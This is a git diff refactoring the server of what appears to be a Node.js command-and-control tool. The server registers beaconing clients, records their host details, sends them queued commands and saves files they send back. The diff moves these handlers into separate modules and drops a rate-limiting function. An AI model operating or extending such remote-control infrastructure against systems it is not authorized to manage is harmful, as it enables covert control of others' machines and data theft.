@@ -20,25 +20,16 @@
  */
 //  ------------------------------------- VARIABLES -------------------------------------
 const { createServer } = require('node:net');
-const { promisify } = require('node:util');
-
-const { mkdir, readdir, writeFile, existsSync } = require('node:fs');
-const { join } = require('node:path');
 
 const { encryptData, decryptData, getSessionId } = require('./utils/encdec');
 const { getUptime, displayCommandOptions, getHowel, getStartup, displayActivePlugins } = require('./utils/helpers');
 const { log, logInfo, logError, logSuccess, createLogStream } = require('./utils/logging');
 const { startInputListener } = require('./utils/readline');
+const { handleResponse, handleBeacon, handleDownloadResponse } = require('./utils/handlers');
+const { setClientActive, showClient, showActiveClients, executeQueuedCommands } = require('./utils/clients');
+const { loadAndRegisterPlugins } = require('./utils/plugins');
 
 const config = require('./config/configLoader');
-
-// promises
-const mkdir_promise = promisify(mkdir);
-const readdir_promise = promisify(readdir);
-const writeFile_promise = promisify(writeFile);
-
-const DOWNLOADS_FOLDER = join(__dirname, config.path.downloads);
-const PLUGINS_FOLDER = join(__dirname, config.path.plugins);
 
 const activeClients = new Map();
 const queuedCommands = new Map();
@@ -46,135 +37,13 @@ const loadedPlugins = new Map();
 const serverCommands = ['help', 'client', 'clients', 'exit', 'plugins', 'set', 'uptime', 'clear'];
 const clientCommands = [];
 
+const startTime = Date.now(); // script start time
+
 let rl = null; // console readline instance
-let activeClientSessionID = null; // active client
 let server = null; // server sockets instance
 let logStream = null; // log stream instance
-let startTime = Date.now(); // script start time
 
-/**
- * Beacon handler
- * @param {*} response
- * @param {*} sessionId 
- */
-const handleBeacon = (response, sessionId) => {
-    const client = activeClients.get(sessionId);
-    logInfo(`\nReceived beacon from client: ${sessionId}`, logStream);
-    const date = new Date();
-    const dateOptions = { year: 'numeric', month: 'long', day: 'numeric' };
-    const timeOptions = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
-    const formattedDate = date.toLocaleDateString('en-US', dateOptions);
-    const formattedTime = date.toLocaleTimeString('en-US', timeOptions);
-    client.lastSeen = `${formattedDate} ${formattedTime}`;
-    client.active = true;
-    client.type = response.type;
-    client.version = response.version;
-    client.platform = response.platform, 
-    client.arch = response.arch, 
-    client.osver = response.osver, 
-    client.hostname = response.hostname
-    executeQueuedCommands(client);
-};
-
-/**
- * Download handler
- * @param {*} response
- * @param {*} client
- */
-const handleDownloadResponse = async (response) => {
-    try {
-        if (!existsSync(DOWNLOADS_FOLDER)) {
-            await mkdir_promise(DOWNLOADS_FOLDER);
-        }
-        const fileName = response.download;
-        const assembledFilePath = join(DOWNLOADS_FOLDER, fileName);
-        await writeFile_promise(assembledFilePath, Buffer.from(response.data, 'base64'));
-        logSuccess(`\nFile "${fileName}" downloaded successfully to ${DOWNLOADS_FOLDER}`, logStream);
-    } catch (error) {
-        logError(`Error handling download response: ${error.message}`, logStream);
-    }
-};
-
-/**
- * Default handler
- * @param {*} response 
- * @returns 
- */
-const handleResponse = (response) => {
-    if (!response) {
-        logError("Error: invalid response.", logStream);
-        return;
-    }
-    // deconstruct the response response if exists;
-    if (response.response) {
-        response = response.response;
-    }
-    if (response.data) {
-        let data = response.data;
-        if (data.type === "Buffer") {
-            // handle buffer response
-            const response = Buffer.from(data.data).toString('utf8').trim();
-            log(response, undefined, logStream);
-            return;
-        } else {
-            if (typeof data !== 'string') {
-                data = JSON.stringify(data);
-            }
-            log(data.toString('utf8').trim(), undefined, logStream);
-        }
-        return;
-    } else if (response.message) {
-        logInfo(response.message, logStream);
-        return;
-    } else if (response.error) {
-        logError(response.error, logStream);
-        return;
-    }
-};
-
-/**
- * Shows the full active client details
- */
-const showClient = (activeClientSessionID, activeClients, logStream) => {
-    if (!activeClientSessionID) {
-        throw new Error(`You must set a session ID first.`);
-    }
-    const client = activeClients.get(activeClientSessionID);
-    if (!client) {
-        throw new Error(`Invalid session ID: ${activeClientSessionID}`);
-    }
-    log("\nClient Details:", 93, logStream);
-    log(["Last Seen:\t\t", client.lastSeen], [96, 97], logStream);
-    log(["Active:\t\t\t", client.active], [96, 97], logStream);
-    log(["Session ID:\t\t", client.sessionId], [96, 97], logStream);
-    log(["Hostname:\t\t", client.hostname], [96, 97], logStream);
-    log(["IP Address:\t\t", client.address], [96, 97], logStream);
-    log(["Type:\t\t\t", client.type], [96, 97], logStream);
-    log(["Client Ver:\t\t", client.version], [96, 97], logStream);
-    log(["Architecture:\t\t", client.arch], [96, 97], logStream);
-    log(["Platform:\t\t", client.platform], [96, 97], logStream);
-    log(["OS Ver:\t\t\t", client.osver, "\n"], [96, 97, 97], logStream);
-};
-
-/**
- * Sets the active client session ID
- * @param {*} sessionId 
- * @param {*} logStream
- */
-const setClientActive = (sessionId, logStream) => {
-    if (!sessionId) {
-        activeClientSessionID = null;
-        log('The active session ID has been cleared.', undefined, logStream);
-        return;
-    }
-    let clientExists = activeClients.get(sessionId);
-    if (sessionId && clientExists && sessionId.length === 32) {
-        activeClientSessionID = sessionId;
-        log(`${activeClientSessionID} is now the active session.`, undefined, logStream);
-    } else {
-        logError('Invalid session ID.', logStream);
-    }
-};
+let activeClientSessionID = null; // active client session ID
 
 /**
  * Handles the command input for the server
@@ -225,7 +94,7 @@ const handleServerCommand = async (command, properties, logStream) => {
                         log(getUptime(startTime), undefined, logStream);
                         break;
                     case 'set':
-                        setClientActive(properties[0]);
+                        activeClientSessionID = setClientActive(activeClientSessionID, properties[0], logStream);
                         break;
                     case 'plugins':
                         displayActivePlugins(loadedPlugins, logStream);
@@ -252,8 +121,6 @@ const handleServerCommand = async (command, properties, logStream) => {
         logError(`Exception: ${error.message}`, logStream);
     }
 };
-
-//  ------------------------------------- Methods -------------------------------------
 
 /**
  * Sends a command to a client
@@ -304,129 +171,10 @@ const executeClientCommand = async (client, command) => {
 };
 
 /**
- * Execute the queued command on a session ID
- */
-const executeQueuedCommands = async (client) => {
-    if (!client || !client.sessionId) {
-        throw new Error('No active session ID set.');
-    }
-    const commands = queuedCommands.get(client.sessionId);
-    if (commands) {
-        commands.forEach(async ({ command, args }) => {
-            await executeClientCommand(client, `${command} ${args.join(' ')}`);
-            logInfo(`Queued client command executed: ${command} ${args.join(' ')}`, logStream);
-        });
-        queuedCommands.delete(client.sessionId);
-    }
-};
-
-/**
- * Shows the clients list
- * @returns 
- */
-const showActiveClients = (activeClients, logStream) => {
-    if (activeClients.size === 0) {
-        getHowel(logStream);
-        logInfo('No active clients.', logStream);
-        return;
-    }
-    const active = Array.from(activeClients.values()).filter(client => client.active).length;
-    logSuccess(`\nClient Sessions (${activeClients.size} Total / ${active} Active):`, logStream);
-    const colWidths = [36, 15, 20, 10, 10, 10, 10];
-    const totalWidth = colWidths.reduce((sum, width) => sum + width, 0) + colWidths.length + 1;
-    const pad = (str, len) => str ? str.padEnd(len) : "".padEnd(10);
-    logInfo('┌' + '─'.repeat(totalWidth - 2) + '┐', logStream);
-    logInfo('│' + pad('SessionID', colWidths[0]) + '│' +
-                     pad('ClientIP', colWidths[1]) + '│' +
-                     pad('Updated', colWidths[2]) + '│' +
-                     pad('Online', colWidths[3]) + '│' +
-                     pad('Active', colWidths[4]) + '│' +
-                     pad('Ver', colWidths[5]) + '│' +
-                     pad('Type', colWidths[6]) + '│', logStream);
-    logInfo('├' + colWidths.map(w => '─'.repeat(w)).join('┼') + '┤', logStream);
-    for (const [sessionId, client] of activeClients) {
-        const datetime = new Date(client.lastSeen);
-        const lastSeen = datetime.toLocaleDateString('en-US', {
-            weekday: 'short',
-            year: 'numeric',
-            month: 'short',
-            day: 'numeric'
-        });
-        logInfo('│' + pad(sessionId, colWidths[0]) + '│' +
-                         pad(client.address, colWidths[1]) + '│' +
-                         pad(lastSeen, colWidths[2]) + '│' +
-                         pad(client.active ? 'Yes' : 'No', colWidths[3]) + '│' +
-                         pad(client.sessionId === activeClientSessionID ? 'Yes' : 'No', colWidths[4]) + '│' +
-                         pad(client.version, colWidths[5]) + '│' +
-                         pad(client.type, colWidths[6]) + '│', logStream);
-    }
-    logInfo('└' + colWidths.map(w => '─'.repeat(w)).join('┴') + '┘', logStream);
-};
-
-/**
- * Registers a plugin for the server
- * @param {*} plugin 
- */
-const registerPlugin = (plugin) => {
-    // Register additional commands provided by the plugin
-    if (plugin && plugin.module) {
-        const commandKeys = Object.keys(plugin.module.commands).filter(c => c.method !== 'execute');
-        if (plugin.module.type === 'server') {
-            serverCommands.push(...commandKeys);
-        } else if(plugin.module.type === 'client') {
-            clientCommands.push(...commandKeys);
-        }
-        commandKeys.forEach((command) => {
-            // Extract command name and function
-            const cmd = plugin.module.commands[command],
-                  name = cmd.name,
-                  handler = cmd.handler;
-
-            // Check if the command name is not already registered
-            if (!global[name]) {
-                // Register the command globally
-                global[name] = handler;
-            } else {
-                logError(`Plugin: "${plugin.name}" is already registered.`, logStream);
-            }
-        });
-    }
-    logInfo(`Plugin: "${plugin.name} - ${plugin.module.description}" has been registered.`, logStream);
-
-    // Add the plugin to the loaded plugins map
-    loadedPlugins.set(plugin.name, plugin.module);
-};
-
-/**
- * Loads plugins for the server then registers them
- */
-const loadAndRegisterPlugins = async () => {
-    try {
-        const pluginFiles = await readdir_promise(PLUGINS_FOLDER, { withFileTypes: true });
-        await Promise.all(pluginFiles.map((file) => {
-            const pluginName = file.name;
-            const pluginPath = join(PLUGINS_FOLDER, pluginName);
-            const pluginModule = require(pluginPath);
-            if (!pluginModule || typeof pluginModule !== 'object') {
-                logError(`Invalid plugin module in file "${pluginName}". Skipping...`, logStream);
-                return;
-            }
-            // Check if the plugin module exports the 'commands' object
-            if (!pluginModule.commands) {
-                logError(`Plugin "${pluginName}" does not have valid commands defined.`, logStream);
-                return;
-            }
-            if (file.isFile()) {
-                registerPlugin({ name: pluginName, module: pluginModule });
-            }
-        }));
-    } catch (err) {
-        logError(`Error loading plugins: ${err.message}`, logStream);
-    }
-};
-
-/**
  * Sends the client command
+ * @param {*} command 
+ * @param {*} args 
+ * @returns 
  */
 const sendClientCommand = async (command, args) => {
     const sessionId = activeClientSessionID || null;
@@ -441,30 +189,6 @@ const sendClientCommand = async (command, args) => {
     } else {
         logInfo(`You must first set an active client sessionID.`, logStream);
     }
-};
-
-/**
- * Implement rate limiting per IP
- * @param {*} ipAddress 
- * @returns 
- */
-const rateLimit = (ipAddress) => {
-    const now = Date.now();
-    if (!rateLimits[ipAddress]) {
-        rateLimits[ipAddress] = { count: 1, lastRequest: now };
-        return true;
-    }
-
-    const timeSinceLastRequest = now - rateLimits[ipAddress].lastRequest;
-    if (timeSinceLastRequest < config.rateLimit.window) {
-        if (rateLimits[ipAddress].count >= config.rateLimit.maxRequests) {
-            return false;
-        }
-        rateLimits[ipAddress].count++;
-    } else {
-        rateLimits[ipAddress] = { count: 1, lastRequest: now };
-    }
-    return true;
 };
 
 /**
@@ -532,9 +256,9 @@ server = createServer((socket) => {
                     const parsed = JSON.parse(decrypted);
                     const response = parsed.response;
                     if (response.download) {
-                        await handleDownloadResponse(response);
+                        await handleDownloadResponse(response, logStream);
                     } else {
-                        handleResponse(response);
+                        handleResponse(response, logStream);
                     }
                     client.waiting = false;
                     client.buffer = '';
@@ -545,13 +269,14 @@ server = createServer((socket) => {
                 const parsed = JSON.parse(decrypted);
                 const response = parsed.response;
                 if (response.beacon) {
-                    handleBeacon(response, client.sessionId);
+                    handleBeacon(response, client, logStream);
+                    await executeQueuedCommands(client, queuedCommands, logStream);
                 } else if (response.download) {
-                    await handleDownloadResponse(response, client.sessionId);
+                    await handleDownloadResponse(response, client.sessionId, logStream);
                 } else if (response.error) {
                     logError(response.error, logStream);
                 } else {
-                    handleResponse(response);
+                    handleResponse(response, logStream);
                 }
             }
         } catch(err) {
@@ -587,7 +312,7 @@ server.listen(config.server.port, config.server.host, async () => {
     getStartup(startTime, logStream);
 
     // register plugins
-    await loadAndRegisterPlugins();
+    await loadAndRegisterPlugins(clientCommands, serverCommands, loadedPlugins, logStream);
 
     // start input listener
     rl = await startInputListener();
